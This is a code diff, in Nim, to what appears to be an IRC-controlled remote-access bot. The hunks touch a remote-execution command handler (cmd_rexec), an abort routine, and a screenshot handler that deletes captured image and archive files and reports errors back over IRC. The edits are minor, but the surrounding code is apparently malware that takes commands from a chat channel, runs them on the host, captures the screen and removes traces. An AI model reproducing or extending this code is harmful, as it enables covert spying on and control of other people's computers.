@@ -307,11 +307,6 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
 
         discard helper_responseHandler(rexec_runCommand(args), client, event)
 
-    # if caught:
-    #     for line in response.output.splitLines():
-    #         client.privmsg(event.origin, line)
-
-
 
 
 
@@ -320,6 +315,9 @@ proc cmd_abort():void {.thread.} =
     g_abort = true
     sleep(2500)
     g_abort = false
+
+
+
 
 
 ## Playing around with the sleep time used in cmd_responseHandler
@@ -374,20 +372,23 @@ proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
             if fileExists(scrndir & "\\" & $rand_filename & ".bmp"):
                 removeFile(scrndir & "\\" & $rand_filename & ".bmp")
         except OSError as e:
-            discard client.privmsg(event.origin, "problem removing" & $rand_filename & ".bmp" & "  [" & repr(e) & "]")
+            discard client.privmsg(event.origin, "problem removing " & $rand_filename & ".bmp" & "  [" & repr(e) & "]")
 
         try:  
             if fileExists(scrndir & "\\" & $rand_filename & ".gz"):
                 removeFile(scrndir & "\\" & $rand_filename & ".gz")
         except OSError as e:
-            discard client.privmsg(event.origin, "problem removing" & $rand_filename & ".gz" & "  [" & repr(e) & "]")
+            discard client.privmsg(event.origin, "problem removing " & $rand_filename & ".gz" & "  [" & repr(e) & "]")
 
         try:
             if dirExists(scrndir):
                 removeDir(scrndir)
         except OSError as e:
-            discard client.privmsg(event.origin, "problem removing" & scrndir & "  [" & repr(e) & "]")
+            setCurrentDir(current_dir)  
+            discard client.privmsg(event.origin, "problem removing " & scrndir & "  [" & repr(e) & "]")
         setCurrentDir(current_dir)  
+
+
 
 
 
